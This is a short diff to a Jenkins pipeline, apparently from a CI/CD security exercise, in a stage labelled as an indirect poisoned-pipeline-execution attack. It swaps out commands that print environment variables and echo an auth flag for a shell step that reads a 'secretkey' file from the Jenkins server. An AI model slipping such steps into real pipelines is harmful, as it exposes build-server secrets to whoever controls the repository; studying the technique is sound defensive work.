@@ -32,8 +32,10 @@ pipeline {
         }
         stage (' Indirect PPE Attack '){
              steps {
-                sh('printenv | sort') 
-                echo env.DISABLE_AUTH
+                sh '''
+                cd /var/lib/jenkins/temp
+                cat secretkey
+                '''
             }
         }
     }
